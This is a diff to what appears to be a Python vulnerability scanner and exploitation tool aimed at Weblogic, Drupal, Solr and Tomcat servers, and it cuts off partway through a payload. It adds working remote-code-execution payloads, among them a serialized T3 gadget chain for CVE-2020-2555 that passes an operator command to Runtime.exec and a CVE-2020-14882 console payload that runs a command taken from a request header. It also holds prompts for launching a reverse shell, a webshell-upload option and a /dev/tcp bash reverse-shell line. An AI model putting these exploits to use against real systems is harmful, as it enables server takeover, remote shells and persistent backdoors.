@@ -18,6 +18,7 @@ import uuid
 import http.client
 import urllib
 import urllib.request
+import platform
 from urllib import request, parse
 from urllib.parse import urlencode
 from urllib.parse import urlparse, quote
@@ -53,11 +54,11 @@ class Timed(object):
         time.sleep(de)
         timed = color.cyan("["+str(now)[11:19]+"] ")
         return timed
-    def timed_ouput_file(self, de):
+    def no_color_timed(self, de):
         now = datetime.now()
         time.sleep(de)
-        timed_ouput_file = "["+str(now)[11:19]+"] "
-        return timed_ouput_file
+        no_color_timed = "["+str(now)[11:19]+"] "
+        return no_color_timed
 now = Timed()
 
 
@@ -103,7 +104,7 @@ class Colored(object):
     def exp_nc(self):
         return now.timed(de=0) + color.yeinfo() + color.yellow(" input \"nc\" bounce linux shell")
     def exp_nc_bash(self):
-        return now.timed(de=0) + color.yeinfo() + color.yellow(" nc shell: \"bash -i >&/dev/tcp/192.168.1.2/9999 0>&1\"")
+        return now.timed(de=0) + color.yeinfo() + color.yellow(" nc shell: \"bash -i >&/dev/tcp/127.0.0.1/9999 0>&1\"")
     def exp_upload(self):
         return now.timed(de=0) + color.yeinfo() + color.yellow(" input \"upload\" upload webshell")
 color = Colored()
@@ -137,6 +138,7 @@ vulnlist = color.ccyan("""
  | Apache Tomcat     | CVE-2020-1938    |  Y  |  Y  | 6, 7 < 7.0.100, 8 < 8.5.51, 9 < 9.0.31 arbitrary file read  |
  | Drupal            | CVE-2018-7600    |  Y  |  Y  | 6.x, 7.x, 8.x, drupalgeddon2 remote code execution          |
  | Drupal            | CVE-2018-7602    |  Y  |  Y  | < 7.59, < 8.5.3 (except 8.4.8) drupalgeddon2 rce            |
+ | Drupal            | CVE-2019-6340    |  Y  |  Y  | < 8.6.10, drupal core restful remote code execution         |
  | Jenkins           | CVE-2017-1000353 |  Y  |  N  | <= 2.56, LTS <= 2.46.1, jenkins-ci remote code execution    |
  | Jenkins           | CVE-2018-1000861 |  Y  |  Y  | <= 2.153, LTS <= 2.138.3, remote code execution             |
  | Nexus OSS/Pro     | CVE-2019-7238    |  Y  |  Y  | 3.6.2 - 3.14.0, remote code execution vulnerability         |
@@ -148,6 +150,8 @@ vulnlist = color.ccyan("""
  | Oracle Weblogic   | CVE-2019-2725    |  Y  |  Y  | 10.3.6.0, 12.1.3.0, weblogic wls9-async deserialization rce |
  | Oracle Weblogic   | CVE-2019-2729    |  Y  |  Y  | 10.3.6.0, 12.1.3.0, 12.2.1.3 wls9-async deserialization rce |
  | Oracle Weblogic   | CVE-2020-2551    |  Y  |  N  | 10.3.6.0, 12.1.3.0, 12.2.1.3-4, wlscore deserialization rce |
+ | Oracle Weblogic   | CVE-2020-2555    |  Y  |  Y  | 3.7.1.17, 12.1.3.0.0, 12.2.1.3-4.0, t3 deserialization rce  |
+ | Oracle Weblogic   | CVE-2020-14882   |  Y  |  Y  | 10.3.6.0, 12.1.3.0, 12.2.1.3-4, 14.1.1.0.0, console rce     |
  | RedHat JBoss      | CVE-2010-0738    |  Y  |  Y  | 4.2.0 - 4.3.0, jmx-console deserialization any files upload |
  | RedHat JBoss      | CVE-2010-1428    |  Y  |  Y  | 4.2.0 - 4.3.0, web-console deserialization any files upload |
  | RedHat JBoss      | CVE-2015-7501    |  Y  |  Y  | 5.x, 6.x, jmxinvokerservlet deserialization any file upload |
@@ -186,6 +190,9 @@ explists = ("CVE-2017-12629"
             "CVE-2018-2894"
             "CVE-2019-2725"
             "CVE-2019-2729"
+            "CVE-2020-2555"
+            "CVE-2020-2883"
+            "CVE-2020-14882"
             "CVE-2010-0738"
             "CVE-2010-1428"
             "CVE-2015-7501"
@@ -210,17 +217,14 @@ class Verification(object):
             print (rawdata)
         if OUTPUT is not None:
             self.file_output(self.no_color_show_succes(request, pocname, method, rawdata, info))
+            
     def no_rce_show(self, request, pocname, method, rawdata, info):
-        
         if VULN is not None:
             if r"PoCWating" in request:
                 print (now.timed(de=DELAY)+color.yeinfo()+color.yellow(" Command Executed Successfully (No Echo)"))
             else:
-                
                 print (request)
-            
             return None
-        
         print (now.timed(de=DELAY)+color.green("[+] The target is "+pocname+" ["+method+"] "+info))
         #print (info)
         if DEBUG=="debug":
@@ -228,24 +232,32 @@ class Verification(object):
         if OUTPUT is not None:
             self.file_output(self.no_color_show_succes(request, pocname, method, rawdata, info))
     def no_color_show_succes(self, request, pocname, method, rawdata, info):
-        return now.timed_ouput_file(de=DELAY)+"[+] The target is "+pocname+" ["+method+"] "+info+'\n'+rawdata
+        return now.no_color_timed(de=DELAY)+"[+] The target is "+pocname+" ["+method+"] "+info+'\n'+rawdata
     def no_color_show_failed(self, request, pocname, method, rawdata, info):
-        return now.timed_ouput_file(de=DELAY)+"[-] The target is "+pocname+" ["+method+"] "
+        return now.no_color_timed(de=DELAY)+"[-] The target is "+pocname+" ["+method+"] "
     def generic_output(self, request, pocname, method, rawdata, info):
         # Echo Error
-        # if r"VuLnEcHoPoCSuCCeSS" in request and r"echo" in request:
-        #     print (now.timed(de=DELAY)+color.magenta("[-] The target no "+pocname))
-        if r"VuLnEcHoPoCSuCCeSS" in request:
-            self.no_rce_show(request, pocname, method, rawdata, info)
+        if r"echo%20VuLnEcHoPoCSuCCeSS" in request or r"echo VuLnEcHoPoCSuCCeSS" in request:
+            print (now.timed(de=DELAY)+color.magenta("[-] The target no "+pocname))
+        elif r"VuLnEcHoPoCSuCCeSS" in request:
+            self.show(request, pocname, method, rawdata, info)
+        # Linux host ====================================================================
+        elif r"uid=" in request:
+            info = info+color.green(" [os:linux]")
+            self.show(request, pocname, method, rawdata, info)
+        elif r"Active Internet connections" in request or r"command not found" in request:
+            info = info+color.green(" [os:linux]")
+            self.show(request, pocname, method, rawdata, info)
+        # Windows host ==================================================================
+        elif r"Active Connections" in request  or r"活动连接" in request:
+            info = info+color.green(" [os:windows]")
+            self.show(request, pocname, method, rawdata, info)
+        # Public :-)
         elif r":-)" in request:
             self.no_rce_show(request, pocname, method, rawdata, info)
         # Apache Tomcat: verification CVE-2020-1938
         elif r"Welcome to Tomcat" in request and r"You may obtain a copy of the License at" in request:
             self.no_rce_show(request, pocname, method, rawdata, info)
-        # Public: "ID" command exec
-        elif r"uid=" in request:
-            info = info+color.green(" [os:linux]")
-            self.show(request, pocname, method, rawdata, info)
         # Struts2-045 "233x233"
         elif r"54289" in request:
             self.show(request, pocname, method, rawdata, info)
@@ -256,12 +268,6 @@ class Verification(object):
         elif r"PoCWating" in request:
             print (now.timed(de=DELAY)+color.magenta("[-] The target no "+pocname))
         # Public: "netstat -an" command check
-        elif r"Active Internet connections" in request or r"command not found" in request:
-            info = info+color.green(" [os:linux]")
-            self.show(request, pocname, method, rawdata, info)
-        elif r"Active Connections" in request  or r"活动连接" in request:
-            info = info+color.green(" [os:windows]")
-            self.show(request, pocname, method, rawdata, info)
         elif r"NC-Succes" in request:
             print (now.timed(de=DELAY)+color.yeinfo()+color.green(" The reverse shell succeeded. Please check"))
         elif r"NC-Failed" in request:
@@ -287,11 +293,11 @@ class Verification(object):
     def timeout_output(self, pocname):
         print (now.timed(de=DELAY)+color.rewarn()+color.cyan(" "+pocname+" check failed because timeout !!!"))
         if OUTPUT is not None:
-            self.file_output(now.timed_ouput_file(de=DELAY)+" "+pocname+" check failed because timeout !!!")
+            self.file_output(now.no_color_timed(de=DELAY)+" "+pocname+" check failed because timeout !!!")
     def connection_output(self, pocname):
         print (now.timed(de=DELAY)+color.rewarn()+color.cyan(" "+pocname+" check failed because unable to connect !!!"))
         if OUTPUT is not None:
-            self.file_output(now.timed_ouput_file(de=DELAY)+" "+pocname+" check failed because unable to connect !!!")
+            self.file_output(now.no_color_timed(de=DELAY)+" "+pocname+" check failed because unable to connect !!!")
     def file_output(self, item):
         with open(OUTPUT, 'a') as output_file:
             output_file.write("%s\n" % item)
@@ -750,6 +756,7 @@ class ApacheSolr():
         self.method = "get"
         self.urlcore = self.url+"/solr/admin/cores?indexInfo=false&wt=json"
         self.rawdata = None
+        self.r = "PoCWating"
         try:
             self.request = requests.get(url=self.urlcore, timeout=TIMEOUT, verify=False)
             try:
@@ -771,12 +778,19 @@ class ApacheSolr():
               }
             }
             """
-            self.request = requests.post(self.urlapi, data=self.set_api_data, headers=self.headers_json, timeout=TIMEOUT, verify=False)
-            self.request = requests.post(self.urlapi, data=self.set_api_data, headers=self.headers_json, timeout=TIMEOUT, verify=False)
-            self.request = requests.get(self.url+"/solr/"+str(self.corename)+self.payload_2, timeout=TIMEOUT, verify=False)
-            self.request = requests.get(self.url+"/solr/"+str(self.corename)+self.payload_2, timeout=TIMEOUT, verify=False)
-            self.rawdata = dump.dump_all(self.request).decode('utf-8','ignore')
-            verify.generic_output(self.request.text, self.pocname, self.method, self.rawdata, self.info)
+            if VULN == None:
+                self.request = requests.post(self.urlapi, data=self.set_api_data, headers=self.headers_json, timeout=TIMEOUT, verify=False)
+                self.rawdata = dump.dump_all(self.request).decode('utf-8','ignore')
+                if self.request.status_code == 200:
+                    self.r = "PoCSuCCeSS"
+                    verify.generic_output(self.r, self.pocname, self.method, self.rawdata, self.info)
+                else:
+                    verify.generic_output(self.r, self.pocname, self.method, self.rawdata, self.info)
+            else:
+                self.request = requests.post(self.urlapi, data=self.set_api_data, headers=self.headers_json, timeout=TIMEOUT, verify=False)
+                self.rawdata = dump.dump_all(self.request).decode('utf-8','ignore')
+                self.request = requests.get(self.url+"/solr/"+str(self.corename)+self.payload_2, timeout=TIMEOUT, verify=False)
+                verify.generic_output(self.request.text, self.pocname, self.method, self.rawdata, self.info)
         except requests.exceptions.Timeout as error:
             verify.timeout_output(self.pocname)
         except requests.exceptions.ConnectionError as error:
@@ -1311,6 +1325,10 @@ class ApacheTomcat():
         self.getipport = urlparse(self.url)
         self.hostname = self.getipport.hostname
         self.port = self.getipport.port
+        if self.port == None and r"https://" in self.url:
+            self.port = 443
+        elif self.port == None and r"http://" in self.url:
+            self.port = 80
         # Do not use the payload:CVE-2017-12615 when checking
         # Use the payload:CVE-2017-12615 when exploiting
         # Because it is too harmful
@@ -1566,15 +1584,17 @@ class Drupal():
             if VULN is None:
                 self.request = requests.post(self.url + self.path, data=self.payload, headers=self.headers, 
                     timeout=TIMEOUT, verify=False)
-                if r"LISTEN" not in self.request.text:
-                    if r"uid=" not in self.request.text:
-                        if self.request.status_code == 403 and r"u0027access" in self.request.text:
-                            self.r = "PoCSuCCeSS"
-                            verify.generic_output(self.r, self.pocname, self.method, self.rawdata, self.info)
-                    else:
-                        verify.generic_output(self.request.text, self.pocname, self.method, self.rawdata, self.info)
-                else:
-                    verify.generic_output(self.request.text, self.pocname, self.method, self.rawdata, self.info)
+                self.rawdata = dump.dump_all(self.request).decode('utf-8','ignore')
+                verify.generic_output(self.request.text, self.pocname, self.method, self.rawdata, self.info)
+#                if r"LISTEN" not in self.request.text:
+#                    if r"uid=" not in self.request.text:
+#                        if self.request.status_code == 403 and r"u0027access" in self.request.text:
+#                            self.r = "PoCSuCCeSS"
+#                            verify.generic_output(self.r, self.pocname, self.method, self.rawdata, self.info)
+#                    else:
+#                        verify.generic_output(self.request.text, self.pocname, self.method, self.rawdata, self.info)
+#                else:
+#                    verify.generic_output(self.request.text, self.pocname, self.method, self.rawdata, self.info)
             else:
                 self.request = requests.post(self.url + self.path, data=self.payload, headers=self.headers, 
                     timeout=TIMEOUT, verify=False)
@@ -1865,6 +1885,10 @@ class OracleWeblogic():
         self.getipport = urlparse(self.url)
         self.hostname = self.getipport.hostname
         self.port = self.getipport.port
+        if self.port == None and r"https://" in self.url:
+            self.port = 443
+        elif self.port == None and r"http://" in self.url:
+            self.port = 80
         if r"https://" in self.url:
             self.url = "https://"+self.hostname+":"+str(self.port)
         if r"http://" in self.url:
@@ -13014,6 +13038,112 @@ class OracleWeblogic():
             <void index="6005"><byte>45</byte></void>
             </array></void></array></java></work:WorkContext></soapenv:Header><soapenv:Body><asy:onAsyncDelivery/>
             </soapenv:Body></soapenv:Envelope>'''
+        self.payload_t3 = ('000005c3016501ffffffffffffffff0000006a0000ea600000001900937b484a56fa4a777666f581daa4f'
+            '5b90e2aebfc607499b4027973720078720178720278700000000a00000003000000000000000600707070'
+            '7070700000000a000000030000000000000006007006fe010000aced00057372001d7765626c6f6769632'
+            'e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f67'
+            '69632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec9020008490'
+            '0056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b73657276696365506163'
+            '6b5a000e74656d706f7261727950617463684c0009696d706c5469746c657400124c6a6176612f6c616e6'
+            '72f537472696e673b4c000a696d706c56656e646f7271007e00034c000b696d706c56657273696f6e7100'
+            '7e000378707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c617373546'
+            '1626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e'
+            '7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b6167657374002'
+            '75b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b4c000e'
+            '72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b0012766572736'
+            '96f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465'
+            '726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7'
+            '249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950'
+            '617463684c0009696d706c5469746c6571007e00044c000a696d706c56656e646f7271007e00044c000b6'
+            '96d706c56657273696f6e71007e000478707702000078fe010000aced00057372001d7765626c6f676963'
+            '2e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200217765626c6f6'
+            '769632e636f6d6d6f6e2e696e7465726e616c2e50656572496e666f585474f39bc908f10200064900056d'
+            '616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a0'
+            '00e74656d706f7261727950617463685b00087061636b616765737400275b4c7765626c6f6769632f636f'
+            '6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b787200247765626c6f6769632e636f6d6'
+            'd6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b61'
+            '67657371')
+        self.payload_t3 += ('007e00034c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5'
+            'b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d'
+            '6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724'
+            '900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d'
+            '706f7261727950617463684c0009696d706c5469746c6571007e00054c000a696d706c56656e646f72710'
+            '07e00054c000b696d706c56657273696f6e71007e000578707702000078fe00fffe010000aced00057372'
+            '00137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c0000787077502100000000000'
+            '00000000d3139322e3136382e312e323237001257494e2d4147444d565155423154362e656883348cd600'
+            '0000070000{0}ffffffffffffffffffffffffffffffffffffffffffffffff78fe010000aced0005737200'
+            '137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c0000787077200114dc42bd07'
+            .format('{:04x}'.format(self.port)))
+        self.payload_t3 += '1a7727000d3234322e323134'
+        self.payload_t3 += '2e312e32353461863d1d0000000078'
+        
+#        self.payload_cve_2020_2555 = ('056508000000010000001b0000005d01010073720178707372027870000000000000000075720'
+#            '3787000000000787400087765626c6f67696375720478700000000c9c979a9a8c9a9bcfcf9b939a7400087765626c6f67696306'
+#            'fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000'
+#            '078707200025b42acf317f8060854e002000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e'
+#            '436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200135b4c6a6176612e6c616e672e4f626a6563743b90c'
+#            'e589f1073296c02000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c'
+#            '65456e7472792f52658157f4f9ed0c000078707200106a6176612e7574696c2e566563746f72d9977d5b803baf0103000349001'
+#            '16361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c'
+#            '6a6176612f6c616e672f4f626a6563743b78707702000078fe010000')
+#        self.payload_cve_2020_2555 += ('aced00057372002e6a617661782e6d616e6167656d656e742e42616441747472696275746556'
+#            '616c7565457870457863657074696f6ed4e7daab632d46400200014c000376616c7400124c6a6176612f6c616e672f4f626a656'
+#            '3743b787200136a6176612e6c616e672e457863657074696f6ed0fd1f3e1a3b1cc4020000787200136a6176612e6c616e672e54'
+#            '68726f7761626c65d5c635273977b8cb0300044c000563617573657400154c6a6176612f6c616e672f5468726f7761626c653b4'
+#            'c000d64657461696c4d6573736167657400124c6a6176612f6c616e672f537472696e673b5b000a737461636b54726163657400'
+#            '1e5b4c6a6176612f6c616e672f537461636b5472616365456c656d656e743b4c001473757070726573736564457863657074696'
+#            'f6e737400104c6a6176612f7574696c2f4c6973743b787071007e0008707572001e5b4c6a6176612e6c616e672e537461636b54'
+#            '72616365456c656d656e743b02462a3c3cfd22390200007870000000037372001b6a6176612e6c616e672e537461636b5472616'
+#            '365456c656d656e746109c59a2636dd8502000449000a6c696e654e756d6265724c000e6465636c6172696e67436c6173737100'
+#            '7e00054c000866696c654e616d6571007e00054c000a6d6574686f644e616d6571007e000578700000004374002079736f73657'
+#            '269616c2e7061796c6f6164732e4356455f323032305f323535357400124356455f323032305f323535352e6a61766174000967'
+#            '65744f626a6563747371007e000b0000000171007e000d71007e000e71007e000f7371007e000b0000002274001979736f73657'
+#            '269616c2e47656e65726174655061796c6f616474001447656e65726174655061796c6f61642e6a6176617400046d61696e7372'
+#            '00266a6176612e7574696c2e436f6c6c656374696f6e7324556e6d6f6469666961626c654c697374fc0f2531b5ec8e100200014'
+#            'c00046c69737471007e00077872002c6a6176612e7574696c2e436f6c6c656374696f6e7324556e6d6f6469666961626c65436f'
+#            '6c6c656374696f6e19420080cb5ef71e0200014c0001637400164c6a6176612f7574696c2f436f6c6c656374696f6e3b7870737'
+#            '200136a6176612e7574696c2e41727261794c6973747881d21d99c7619d03000149000473697a65787000000000770400000000'
+#            '7871007e001a7873720024636f6d2e74616e676f736f6c2e7574696c2e66696c7465722e4c696d697446696c74657299022596d'
+#            '7b4595302000649000b6d5f635061676553697a654900076d5f6e506167654c000c6d5f636f6d70617261746f727400164c6a61'
+#            '76612f7574696c2f436f6d70617261746f723b4c00086d5f66696c74657274001a4c636f6d2f74616e676f736f6c2f7574696c2'
+#            'f46696c7465723b4c000f6d5f6f416e63686f72426f74746f6d71007e00014c000c6d5f6f416e63686f72546f7071007e000178'
+#            '7000000000000000007372002c636f6d2e74616e676f736f6c2e7574696c2e657874726163746f722e436861696e65644578747'
+#            '26163746f72889f81b0945d5b7f02000078720036636f6d2e74616e676f736f6c2e7574696c2e657874726163746f722e416273'
+#            '7472616374436f6d706f73697465457874726163746f72086b3d8c05690f440200015b000c6d5f61457874726163746f7274002'
+#            '35b4c636f6d2f74616e676f736f6c2f7574696c2f56616c7565457874726163746f723b7872002d636f6d2e74616e676f736f6c'
+#            '2e7574696c2e657874726163746f722e4162737472616374457874726163746f72658195303e7238210200014900096d5f6e546'
+#            '172676574787000000000757200235b4c636f6d2e74616e676f736f6c2e7574696c2e56616c7565457874726163746f723b2246'
+#            '204735c4a0fe0200007870000000047372002d636f6d2e74616e676f736f6c2e7574696c2e657874726163746f722e4964656e7'
+#            '4697479457874726163746f72936ee080c7259c4b0200007871007e0022000000007372002f636f6d2e74616e676f736f6c2e75'
+#            '74696c2e657874726163746f722e5265666c656374696f6e457874726163746f72ee7ae995c02fb4a20200025b00096d5f616f5'
+#            '06172616d7400135b4c6a6176612f6c616e672f4f626a6563743b4c00096d5f734d6574686f6471007e00057871007e00220000'
+#            '0000757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000274000a67657452756e7'
+#            '4696d65707400096765744d6574686f647371007e0028000000007571007e002b000000027070740006696e766f6b657371007e'
+#            '0028000000007571007e002b0000000174')
+#        self.payload_cve_2020_2555 += '{:04x}'.format(len(CMD))
+#        self.payload_cve_2020_2555 += CMD.encode().hex()
+#        self.payload_cve_2020_2555 += '7400046578656370767200116a6176612e6c616e672e52756e74696d650000000000000000000000787070'
+#        self.payload_cve_2020_2555 += ('fe010000aced0005737200257765626c6f6769632e726a766d2e496d6d757461626c65536572'
+#            '76696365436f6e74657874ddcba8706386f0ba0c0000787200297765626c6f6769632e726d692e70726f76696465722e4261736'
+#            '96353657276696365436f6e74657874e4632236c5d4a71e0c0000787077020600737200267765626c6f6769632e726d692e696e'
+#            '7465726e616c2e4d6574686f6444657363726970746f7212485a828af7f67b0c000078707734002e61757468656e74696361746'
+#            '5284c7765626c6f6769632e73656375726974792e61636c2e55736572496e666f3b290000001b7878fe00ff')
+#        self.payload_cve_2020_2555 = '%s%s' % ('{:08x}'.format(len(self.payload_cve_2020_2555) // 2 + 4), self.payload_cve_2020_2555)
+        
+        self.payload_cve_2020_14882_v12 = ('_nfpb=true&_pageLabel=&handle='
+            'com.tangosol.coherence.mvel2.sh.ShellSession("weblogic.work.ExecuteThread executeThread = '
+            '(weblogic.work.ExecuteThread) Thread.currentThread(); weblogic.work.WorkAdapter adapter = '
+            'executeThread.getCurrentWork(); java.lang.reflect.Field field = adapter.getClass().getDeclaredField'
+            '("connectionHandler"); field.setAccessible(true); Object obj = field.get(adapter); weblogic.servlet'
+            '.internal.ServletRequestImpl req = (weblogic.servlet.internal.ServletRequestImpl) '
+            'obj.getClass().getMethod("getServletRequest").invoke(obj); String cmd = req.getHeader("cmd"); '
+            'String[] cmds = System.getProperty("os.name").toLowerCase().contains("window") ? new String[]'
+            '{"cmd.exe", "/c", cmd} : new String[]{"/bin/sh", "-c", cmd}; if (cmd != null) { String result '
+            '= new java.util.Scanner(java.lang.Runtime.getRuntime().exec(cmds).getInputStream()).useDelimiter'
+            '("\\\\A").next(); weblogic.servlet.internal.ServletResponseImpl res = (weblogic.servlet.internal.'
+            'ServletResponseImpl) req.getClass().getMethod("getResponse").invoke(req);'
+            'res.getServletOutputStream().writeStream(new weblogic.xml.util.StringInputStream(result));'
+            'res.getServletOutputStream().flush(); res.getWriter().write(""); }executeThread.interrupt(); ");')
 
     # 2020-09-17 complete.
     def cve_2014_4210(self):
@@ -13096,8 +13226,12 @@ class OracleWeblogic():
             self.rawdata = dump.dump_all(self.request).decode('utf-8','ignore')
             verify.generic_output(self.request.text, self.pocname, self.method, self.rawdata, self.info)
             if CMD == "nc":
-                self.ncip = input(now.timed(de=DELAY)+color.green("[+] Nc host(ip): "))
-                self.ncport = input(now.timed(de=DELAY)+color.green("[+] Nc port: "))
+                if os_check() == "linux" or os_check() == "other":
+                    self.ncip = input(now.timed(de=DELAY)+color.green("[+] Nc host(ip): "))
+                    self.ncport = input(now.timed(de=DELAY)+color.green("[+] Nc port: "))
+                elif os_check() == "windows":
+                    self.ncip = input(now.no_color_timed(de=DELAY)+"[+] Nc host(ip): ")
+                    self.ncport = input(now.no_color_timed(de=DELAY)+"[+] Nc port: ")
                 self.nc = self.weblogic_nc.replace("REIP", self.ncip).replace("REPORT", self.ncport)
                 self.request = requests.post(self.url+"/wls-wsat/CoordinatorPortType", data=self.nc, 
                     headers=self.headers, timeout=TIMEOUT, verify=False)
@@ -13239,8 +13373,12 @@ class OracleWeblogic():
             else:
                 verify.generic_output(self.request.text, self.pocname, self.method, self.rawdata, self.info)
             if CMD == "nc":
-                self.ncip = input(now.timed(de=DELAY)+color.green("[+] Nc host(ip): "))
-                self.ncport = input(now.timed(de=DELAY)+color.green("[+] Nc port: "))
+                if os_check() == "linux" or os_check() == "other":
+                    self.ncip = input(now.timed(de=DELAY)+color.green("[+] Nc host(ip): "))
+                    self.ncport = input(now.timed(de=DELAY)+color.green("[+] Nc port: "))
+                elif os_check() == "windows":
+                    self.ncip = input(now.no_color_timed(de=DELAY)+"[+] Nc host(ip): ")
+                    self.ncport = input(now.no_color_timed(de=DELAY)+"[+] Nc port: ")
                 self.nc = self.weblogic_nc.replace("REIP", self.ncip).replace("REPORT", self.ncport)
                 self.request = requests.post(self.url+"/_async/AsyncResponseService", data=self.nc, 
                     headers=self.headers, timeout=TIMEOUT, verify=False)
@@ -13252,7 +13390,10 @@ class OracleWeblogic():
                     verify.generic_output(self.r, self.pocname, self.method, self.rawdata, self.info)
             elif CMD == "upload":
                 self.cmd = "whoami"
-                self.filename = input(now.timed(de=DELAY)+color.green("[+] webshell name(z.jsp): "))
+                if os_check() == "linux" or os_check() == "other":
+                    self.filename = input(now.timed(de=DELAY)+color.green("[+] webshell name(z.jsp): "))
+                elif os_check() == "windows":
+                    self.filename = input(now.no_color_timed(de=DELAY)+"[+] webshell name(z.jsp): ")
                 self.payload_webshell = self.payload_cve_2019_2725.replace("REWEBSHELL", self.filename)
                 self.request = requests.post(self.url+"/_async/AsyncResponseService", data=self.payload_webshell, 
                     headers=self.headers, timeout=TIMEOUT, verify=False)
@@ -13291,8 +13432,12 @@ class OracleWeblogic():
                                          timeout=TIMEOUT, verify=False)
             self.rawdata = dump.dump_all(self.request).decode('utf-8','ignore')
             if CMD == "nc":
-                self.ncip = input(now.timed(de=DELAY) + color.green("[+] Nc host(ip): "))
-                self.ncport = input(now.timed(de=DELAY) + color.green("[+] Nc port: "))
+                if os_check() == "linux" or os_check() == "other":
+                    self.ncip = input(now.timed(de=DELAY) + color.green("[+] Nc host(ip): "))
+                    self.ncport = input(now.timed(de=DELAY) + color.green("[+] Nc port: "))
+                elif os_check() == "windows":
+                    self.ncip = input(now.no_color_timed(de=DELAY) + "[+] Nc host(ip): ")
+                    self.ncport = input(now.no_color_timed(de=DELAY) + "[+] Nc port: ")
                 self.nc = self.weblogic_nc.replace("REIP", self.ncip).replace("REPORT", self.ncport)
                 self.request = requests.post(self.url + "/wls-wsat/CoordinatorPortType", data=self.nc,
                                              headers=self.headers, timeout=TIMEOUT, verify=False)
@@ -13319,6 +13464,10 @@ class OracleWeblogic():
         self.method = "iiop"
         self.payload = bytes.fromhex('47494f50010200030000001700000002000000000000000b4e616d6553657276696365')
         try:
+            if r"https" in self.url:
+                sock = ssl.wrap_socket(socket.socket(socket.AF_INET, socket.SOCK_STREAM))
+            else:
+                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             sock.settimeout(TIMEOUT)
             sock.connect((self.hostname, self.port))
@@ -13331,26 +13480,181 @@ class OracleWeblogic():
             verify.timeout_output(self.pocname)
         except Exception as error:
             verify.generic_output(self.r, self.pocname, self.method, self.rawdata, self.info)
-            
+    
+    # 2020-11-05 
     def cve_2020_2555(self):
         self.pocname = "Oracle Weblogic: CVE-2020-2555"
         self.info = color.derce()
-        self.payload = "null"
-        self.method = "get"
-        self.rawdata = "null"
+        self.method = "giop"
+        self.rawdata = ">_< Vuln CVE-2020-2555 send using giop protocol. So no http request and response"
+        self.r = "PoCWating"
         try:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.settimeout(TIMEOUT)
-            sock.connect((self.hostname, self.port))
-            sock.send(self.payload)
-            self.res = sock.recv(20)
-            if b'GIOP' in self.res:
-                self.r = "PoCSuCCeSS"
-            verify.generic_output(self.r, self.pocname, self.method, self.rawdata, self.info)
+            if VULN is None:
+                self.request = requests.get(self.url + "/console", headers=headers, timeout=TIMEOUT, verify=False)
+                self.v = re.findall("WebLogic Server Version: (.*?)</p>", self.request.text)[0]
+                self.vuln_v = ['3.7.1.17','12.1.3.0.0','12.2.1.3.0','12.2.1.4.0']
+                if self.v in self.vuln_v:
+                    self.r = "PoCSuCCeSS"
+                    verify.generic_output(self.r, self.pocname, self.method, self.rawdata, self.info)
+                else:
+                    verify.generic_output(self.r, self.pocname, self.method, self.rawdata, self.info)
+            else:
+                if r"https" in self.url:
+                    sock = ssl.wrap_socket(socket.socket(socket.AF_INET, socket.SOCK_STREAM))
+                else:
+                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                sock.settimeout(TIMEOUT)
+                sock.connect((self.hostname, self.port))
+                sock.send(bytes.fromhex('74332031322e322e310a41533a3235350a484c3a31390a4d533a31303030303030300a0a'))
+                time.sleep(1)
+                sock.recv(1024)
+                sock.send(bytes.fromhex(self.payload_t3))
+                    #self.resp = sock.recv(4096)
+                    #print(self.resp)
+                self.payload = ('056508000000010000001b0000005d01010073720178707372027870000000000000000075720378700'
+                    '0000000787400087765626c6f67696375720478700000000c9c979a9a8c9a9bcfcf9b939a7400087765626c6f676963'
+                    '06fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f'
+                    '4f9ed0c000078707200025b42acf317f8060854e002000078707702000078fe010000aced00057372001d7765626c6f'
+                    '6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200135b4c6a6176612e6'
+                    'c616e672e4f626a6563743b90ce589f1073296c02000078707702000078fe010000aced00057372001d7765626c6f67'
+                    '69632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200106a6176612e7574696'
+                    'c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e'
+                    '74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78707702000'
+                    '078fe010000')
+                self.payload += ('aced00057372002e6a617661782e6d616e6167656d656e742e42616441747472696275746556616c75'
+                    '65457870457863657074696f6ed4e7daab632d46400200014c000376616c7400124c6a6176612f6c616e672f4f626a6'
